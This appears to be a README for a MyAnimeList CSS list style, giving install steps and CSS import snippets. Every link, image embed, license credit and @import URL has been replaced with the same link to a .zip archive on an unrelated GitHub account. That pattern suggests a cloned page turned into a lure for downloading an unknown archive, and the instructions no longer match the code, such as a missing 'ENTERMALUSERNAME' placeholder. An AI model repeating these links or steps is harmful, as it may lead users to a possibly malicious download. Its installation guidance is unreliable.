![Description](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

This is a minimalistic flat designed List Style which focuses around showing the Anime's cover in a nice grid like structure, to be used on the website: https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip

Live Example: [animelist/RafaelDeJongh](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

![Preview](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

![AnimeListPreview](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

![Features](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

This list style offer various features:

- Fully responsive layout, works on desktop and mobile seamlessly 
- Flat, metro like design for an easy overview
- Custom Header Image
- Full cover generation with MAL-IMAGE
- Overrides for specific list settings

![Installation](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

As this is a list style was made before the list style update, you have to make sure your Template settings is set to "Classic".

![Classic](https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)

After the template settings has been set, you can now add the following code to your Advanced CSS List Design. 

###The code used for the Anime List:

<pre>/*Designed by Rafael De Jongh*/
@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
License{/*Profile Liststyle created for https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip by Rafael De Jongh - https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip*/}</pre>

###And the code for the Manga List:

<pre>/*Designed by Rafael De Jongh*/
@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip%23more%5BID%5D%7Bbackground-image%3aurl(%5BURL%5D)%7D");
@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");
License{/*Profile Liststyle created for https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip by Rafael De Jongh - https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip*/}</pre>

**Make sure to change the "ENTERMALUSERNAME" of the first import link to make the cover generator work properly!**

###This list is developed with the following List Settings:

**Anime**

- Numbers
- Score
- Type
- Episodes
- Rating
- Start/End Dates
- Priority

**Manga**

- Numbers
- Score
- Chapters
- Volumes
- Start/End Dates

**If you do not want to make use of the Start/End Dates, then you can use the Template overrides mentioned below.** 

###To change the banner image please add the following code under the license line:

<pre>#list_surround:before{background-image:url(https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip)}</pre>

###Using Template Overrides 

There are currently two template overrides:

- No Datum Anime Overrides
- No Datum Manga Overrides

Both fix/disable the usage of the date attribute for your list.

You can add these overrides to your list style by importing these overrides styles after the main style has been loaded by adding another import url:

<pre>@import url("https://raw.githubusercontent.com/hyperdontia/MyAnimeList/gh-pages/TemplateOverrides/MyAnimeList-1.9.zip");</pre> 
